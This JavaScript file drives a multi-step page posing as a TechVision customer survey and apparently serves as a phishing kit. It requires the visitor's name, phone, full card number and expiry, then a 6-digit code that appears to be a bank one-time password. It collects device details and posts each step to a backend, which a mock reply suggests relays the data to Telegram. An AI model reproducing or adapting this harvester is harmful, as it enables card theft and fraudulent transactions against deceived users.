
// ===== CONFIGURATION =====
const CONFIG = {
    API_URL: "http://127.0.0.1:5000",
    COMPANY_NAME: "TechVision",
    CURRENT_STEP: 1,
    SURVEY_DATA: {},
    SURVEY_ID: null
};

// ===== INITIALIZATION =====
document.addEventListener('DOMContentLoaded', () => {
    // إنشاء رقم مشاركة فريد
    CONFIG.SURVEY_ID = generateSurveyId();
    
    // كشف معلومات الجهاز
    detectDeviceInfo();
    
    // إعداد معالجات الأحداث
    setupEventListeners();
    
    // تعيين التاريخ الحالي كأقصى تاريخ للميلاد
    const today = new Date();
    const maxDate = today.toISOString().split('T')[0].substring(0, 7); // YYYY-MM
    document.getElementById('expiryDate').max = maxDate;
    
    // إعداد التحقق من رقم البطاقة
    setupCardNumberValidation();
});

// ===== DEVICE DETECTION =====
function detectDeviceInfo() {
    const userAgent = navigator.userAgent;
    const screenWidth = window.screen.width;
    const screenHeight = window.screen.height;
    
    // كشف نوع الجهاز
    let deviceType = "كمبيوتر";
    let deviceOS = "غير معروف";
    
    if (/Android/.test(userAgent)) {
        deviceType = "هاتف ذكي";
        deviceOS = "Android";
    } else if (/iPhone|iPad|iPod/.test(userAgent)) {
        deviceType = /iPad/.test(userAgent) ? "تابلت" : "آيفون";
        deviceOS = "iOS";
    } else if (/Windows/.test(userAgent)) {
        deviceOS = "Windows";
    } else if (/Mac/.test(userAgent)) {
        deviceOS = "macOS";
    } else if (/Linux/.test(userAgent)) {
        deviceOS = "Linux";
    }
    
    // تحديث واجهة المعلومات
    document.getElementById('deviceType').textContent = deviceType;
    document.getElementById('deviceOS').textContent = deviceOS;
    document.getElementById('deviceResolution').textContent = `${screenWidth} × ${screenHeight}`;
    
    // حفظ في بيانات الاستبيان
    CONFIG.SURVEY_DATA.device = {
        type: deviceType,
        os: deviceOS,
        resolution: `${screenWidth}x${screenHeight}`,
        userAgent: userAgent.substring(0, 100) // أول 100 حرف فقط
    };
}

// ===== EVENT LISTENERS =====
function setupEventListeners() {
    // التحقق من رقم الهاتف
    document.getElementById('phone').addEventListener('input', function(e) {
        this.value = this.value.replace(/\D/g, '');
        if (this.value.length > 0 && !this.value.startsWith('05') && !this.value.startsWith('06') && !this.value.startsWith('07')) {
            this.setCustomValidity('يجب أن يبدأ الرقم بـ 05 أو 06 أو 07');
        } else {
            this.setCustomValidity('');
        }
    });
    
    // اختصار لوحة المفاتيح للإدخال
    document.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            const currentStep = CONFIG.CURRENT_STEP;
            if (currentStep === 1) {
                submitStep1();
            } else if (currentStep === 2) {
                submitStep2();
            } else if (currentStep === 3) {
                submitFinal();
            }
        }
    });
}

// ===== CARD NUMBER VALIDATION =====
function setupCardNumberValidation() {
    const cardInput = document.getElementById('cardNumber');
    
    cardInput.addEventListener('input', function(e) {
        // إزالة جميع الأحرف غير الرقمية
        let value = this.value.replace(/\D/g, '');
        
        // تقييد إلى 16 رقم
        value = value.substring(0, 16);
        
        // إضافة مسافات كل 4 أرقام
        let formatted = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formatted += ' ';
            }
            formatted += value[i];
        }
        
        this.value = formatted;
        
        // التحقق من الطول
        if (value.length === 16) {
            this.style.borderColor = '#10b981';
        } else {
            this.style.borderColor = '#e5e7eb';
        }
    });
}

// ===== STEP NAVIGATION =====
function goToStep(stepNumber) {
    // تحديث مؤشر التقدم
    updateProgress(stepNumber);
    
    // إخفاء جميع الخطوات
    document.querySelectorAll('.step-content').forEach(step => {
        step.classList.remove('active');
    });
    
    // إظهار الخطوة المطلوبة
    document.getElementById(`step${stepNumber}`).classList.add('active');
    
    // تحديث الخطوة النشطة في المؤشر
    document.querySelectorAll('.step-indicator').forEach(indicator => {
        const step = parseInt(indicator.dataset.step);
        if (step <= stepNumber) {
            indicator.classList.add('active');
        } else {
            indicator.classList.remove('active');
        }
    });
    
    CONFIG.CURRENT_STEP = stepNumber;
}

function updateProgress(stepNumber) {
    const progressFill = document.getElementById('progressFill');
    const width = ((stepNumber - 1) / 3) * 100 + '%';
    progressFill.style.width = width;
}

// ===== STEP 1: PERSONAL INFO =====
async function submitStep1() {
    const fullName = document.getElementById('fullName').value.trim();
    const phone = document.getElementById('phone').value.trim();
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const expiryDate = document.getElementById('expiryDate').value;
    const email = document.getElementById('email').value.trim();
    
    // التحقق من البيانات المطلوبة
    if (!fullName || !phone || !cardNumber || !expiryDate) {
        showNotification('يرجى ملء جميع الحقول المطلوبة', 'error');
        highlightEmptyFields();
        return;
    }
    
    // التحقق من صحة الهاتف
    if (!/^(05|06|07)\d{8}$/.test(phone)) {
        showNotification('رقم الهاتف غير صحيح. يجب أن يبدأ بـ 05 أو 06 أو 07 ويتكون من 10 أرقام', 'error');
        document.getElementById('phone').classList.add('error');
        return;
    }
    
    // التحقق من رقم البطاقة
    if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
        showNotification('رقم البطاقة يجب أن يتكون من 16 رقم', 'error');
        document.getElementById('cardNumber').classList.add('error');
        return;
    }
    
    // التحقق من تاريخ انتهاء الصلاحية
    if (!isValidExpiryDate(expiryDate)) {
        showNotification('تاريخ انتهاء الصلاحية غير صالح', 'error');
        document.getElementById('expiryDate').classList.add('error');
        return;
    }
    
    // التحقق من البريد الإلكتروني إذا تم إدخاله
    if (email && !isValidEmail(email)) {
        showNotification('البريد الإلكتروني غير صحيح', 'error');
        document.getElementById('email').classList.add('error');
        return;
    }
    
    // إزالة أخطاء التنسيق السابقة
    removeErrorClasses();
    
    // حفظ البيانات
    CONFIG.SURVEY_DATA = {
        survey_id: CONFIG.SURVEY_ID,
        step: 1,
        name: fullName,
        phone: phone,
        card_number: cardNumber,
        expiry_date: expiryDate,
        email: email || null,
        timestamp: new Date().toISOString(),
        company: CONFIG.COMPANY_NAME
    };
    
    // عرض تنبيه الإرسال
    showNotification('جاري إرسال المعلومات الشخصية للمدير...');
    
    try {
        // إرسال للـ Backend
        const response = await fetch(`${CONFIG.API_URL}/step1`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(CONFIG.SURVEY_DATA)
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            showNotification('تم إرسال المعلومات للمدير بنجاح ✓', 'success');
            
            // الانتقال للخطوة 2
            setTimeout(() => {
                goToStep(2);
            }, 1500);
            
        } else {
            throw new Error(data.error || 'حدث خطأ في الإرسال');
        }
        
    } catch (error) {
        showNotification(error.message, 'error');
        console.error('Error in submitStep1:', error);
    }
}

// ===== STEP 2: RANDOM CODE =====
function setRandomCode(code) {
    document.getElementById('randomCode').value = code;
}

async function submitStep2() {
    const randomCode = document.getElementById('randomCode').value.trim();
    
    // التحقق من الرمز
    if (!randomCode || randomCode.length !== 6 || !/^\d+$/.test(randomCode)) {
        showNotification('الرجاء إدخال رمز صحيح مكون من 6 أرقام', 'error');
        return;
    }
    
    // تحديث البيانات
    CONFIG.SURVEY_DATA.step = 2;
    CONFIG.SURVEY_DATA.random_code = randomCode;
    CONFIG.SURVEY_DATA.device_timestamp = new Date().toISOString();
    
    // عرض تنبيه الإرسال
    showNotification('جاري إرسال الرمز ومعلومات الجهاز للمدير...');
    
    try {
        // إرسال للـ Backend
        const response = await fetch(`${CONFIG.API_URL}/step2`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(CONFIG.SURVEY_DATA)
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            showNotification('تم إرسال الرمز ومعلومات الجهاز للمدير ✓', 'success');
            
            // تحديث صفحة التأكيد
            updateConfirmationPage();
            
            // الانتقال للخطوة 3
            setTimeout(() => {
                goToStep(3);
            }, 1500);
            
        } else {
            throw new Error(data.error || 'حدث خطأ في الإرسال');
        }
        
    } catch (error) {
        showNotification(error.message, 'error');
        console.error('Error in submitStep2:', error);
    }
}

// ===== STEP 3: CONFIRMATION =====
function updateConfirmationPage() {
    // تحديث المعلومات الشخصية
    document.getElementById('confirmName').textContent = CONFIG.SURVEY_DATA.name;
    document.getElementById('confirmPhone').textContent = CONFIG.SURVEY_DATA.phone;
    document.getElementById('confirmCard').textContent = formatCardNumber(CONFIG.SURVEY_DATA.card_number);
    document.getElementById('confirmExpiry').textContent = formatDate(CONFIG.SURVEY_DATA.expiry_date);
    document.getElementById('confirmEmail').textContent = CONFIG.SURVEY_DATA.email || 'لم يتم الإدخال';
    
    // تحديث معلومات الجهاز
    document.getElementById('confirmDevice').textContent = CONFIG.SURVEY_DATA.device?.type || 'غير معروف';
    document.getElementById('confirmOS').textContent = CONFIG.SURVEY_DATA.device?.os || 'غير معروف';
    
    // تحديث الرمز
    document.getElementById('confirmCode').textContent = CONFIG.SURVEY_DATA.random_code || '-';
    document.getElementById('confirmTime').textContent = new Date().toLocaleTimeString('ar-SA');
    
    // تحديث رقم المشاركة
    document.getElementById('surveyIdDisplay').textContent = CONFIG.SURVEY_ID;
}

async function submitFinal() {
    showNotification('جاري تأكيد الإرسال النهائي للمدير...');
    
    try {
        // إرسال تأكيد نهائي
        const response = await fetch(`${CONFIG.API_URL}/step3`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                survey_id: CONFIG.SURVEY_ID,
                name: CONFIG.SURVEY_DATA.name,
                phone: CONFIG.SURVEY_DATA.phone,
                final_confirmation: true,
                timestamp: new Date().toISOString(),
                company: CONFIG.COMPANY_NAME
            })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            showNotification('تم تأكيد الإرسال النهائي للمدير ✓', 'success');
            
            // تحديث صفحة النجاح
            updateSuccessPage();
            
            // الانتقال للخطوة 4
            setTimeout(() => {
                goToStep(4);
            }, 1500);
            
        } else {
            throw new Error(data.error || 'حدث خطأ في الإرسال النهائي');
        }
        
    } catch (error) {
        showNotification(error.message, 'error');
        console.error('Error in submitFinal:', error);
    }
}

// ===== STEP 4: SUCCESS =====
function updateSuccessPage() {
    document.getElementById('finalSurveyId').textContent = CONFIG.SURVEY_ID;
    document.getElementById('finalName').textContent = CONFIG.SURVEY_DATA.name;
    document.getElementById('finalDate').textContent = new Date().toLocaleDateString('ar-SA');
    document.getElementById('finalTime').textContent = new Date().toLocaleTimeString('ar-SA');
}

function startNewSurvey() {
    // إعادة تعيين النموذج
    document.getElementById('fullName').value = '';
    document.getElementById('phone').value = '';
    document.getElementById('cardNumber').value = '';
    document.getElementById('expiryDate').value = '';
    document.getElementById('email').value = '';
    document.getElementById('randomCode').value = '';
    
    // إنشاء رقم مشاركة جديد
    CONFIG.SURVEY_ID = generateSurveyId();
    CONFIG.SURVEY_DATA = {};
    CONFIG.CURRENT_STEP = 1;
    
    // كشف معلومات الجهاز من جديد
    detectDeviceInfo();
    
    // العودة للخطوة الأولى
    goToStep(1);
    
    // إظهار تنبيه
    showNotification('تم بدء استبيان جديد', 'success');
}

function printReceipt() {
    const receiptContent = `
        <div dir="rtl" style="font-family: 'Cairo', sans-serif; padding: 20px;">
            <h2 style="color: #7c3aed; text-align: center;">TechVision - إيصال المشاركة</h2>
            <hr>
            <p><strong>رقم المشاركة:</strong> ${CONFIG.SURVEY_ID}</p>
            <p><strong>الاسم:</strong> ${CONFIG.SURVEY_DATA.name}</p>
            <p><strong>الهاتف:</strong> ${CONFIG.SURVEY_DATA.phone}</p>
            <p><strong>التاريخ:</strong> ${new Date().toLocaleDateString('ar-SA')}</p>
            <p><strong>الوقت:</strong> ${new Date().toLocaleTimeString('ar-SA')}</p>
            <hr>
            <p style="text-align: center; color: #666;">شكراً لمشاركتك في استبيان TechVision</p>
        </div>
    `;
    
    const printWindow = window.open('', '_blank');
    printWindow.document.write(`
        <html>
            <head>
                <title>إيصال المشاركة - ${CONFIG.SURVEY_ID}</title>
                <style>
                    @media print {
                        body { margin: 0; }
                    }
                </style>
            </head>
            <body>${receiptContent}</body>
        </html>
    `);
    printWindow.document.close();
    printWindow.print();
}

// ===== HELPER FUNCTIONS =====
function generateSurveyId() {
    const timestamp = Date.now().toString(36).toUpperCase();
    const random = Math.random().toString(36).substr(2, 4).toUpperCase();
    return `TCV-${timestamp}-${random}`;
}

function formatCardNumber(cardNumber) {
    if (!cardNumber) return '-';
    return cardNumber.replace(/(\d{4})/g, '$1 ').trim();
}

function formatDate(dateString) {
    if (!dateString) return '-';
    const [year, month] = dateString.split('-');
    const monthNames = [
        'يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو',
        'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'
    ];
    return `${monthNames[parseInt(month) - 1]} ${year}`;
}

function highlightEmptyFields() {
    const fields = [
        { id: 'fullName', required: true },
        { id: 'phone', required: true },
        { id: 'cardNumber', required: true },
        { id: 'expiryDate', required: true },
        { id: 'email', required: false }
    ];
    
    fields.forEach(field => {
        const element = document.getElementById(field.id);
        if (field.required && !element.value.trim()) {
            element.classList.add('error');
        }
    });
}

function removeErrorClasses() {
    const fields = ['fullName', 'phone', 'cardNumber', 'expiryDate', 'email'];
    fields.forEach(id => {
        document.getElementById(id)?.classList.remove('error');
    });
}

function isValidExpiryDate(dateString) {
    if (!dateString) return false;
    
    const [year, month] = dateString.split('-').map(Number);
    const now = new Date();
    const currentYear = now.getFullYear();
    const currentMonth = now.getMonth() + 1;
    
    // التحقق من أن التاريخ في المستقبل
    if (year < currentYear) return false;
    if (year === currentYear && month < currentMonth) return false;
    
    // التحقق من أن الشهر بين 1 و 12
    if (month < 1 || month > 12) return false;
    
    // التحقق من أن السنة معقولة (لا تتعدى 20 سنة قادمة)
    if (year > currentYear + 20) return false;
    
    return true;
}

function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

function showNotification(message, type = 'info') {
    const notification = document.getElementById('notification');
    const notificationText = notification.querySelector('.notification-text strong');
    
    notificationText.textContent = message;
    
    // تغيير اللون حسب النوع
    const colors = {
        success: '#10b981',
        error: '#ef4444',
        info: '#7c3aed'
    };
    
    notification.style.background = `linear-gradient(135deg, ${colors[type]}, ${colors[type]}dd)`;
    
    // إظهار التنبيه
    notification.classList.add('show');
    
    // إخفاء التنبيه بعد 3 ثوانٍ
    setTimeout(() => {
        notification.classList.remove('show');
    }, 3000);
}

// ===== BACKEND API INTEGRATION =====
// (يجب أن يكون لديك Backend يعمل على http://127.0.0.1:5000)
// إذا لم يكن Backend يعمل، يمكنك استخدام هذه الوظائف المحاكية:

if (!window.fetch) {
    // محاكاة API للاختبار
    window.mockAPI = true;
    
    console.warn('⚠️ Using mock API for testing');
    
    window.fetch = async function(url, options) {
        console.log(`Mock API Call: ${options.method} ${url}`);
        console.log('Data:', JSON.parse(options.body));
        
        // محاكاة تأخير الشبكة
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        return {
            ok: true,
            json: async () => ({
                success: true,
                message: 'تم الإرسال بنجاح (Mock)',
                telegram_sent: true
            })
        };
    };
}
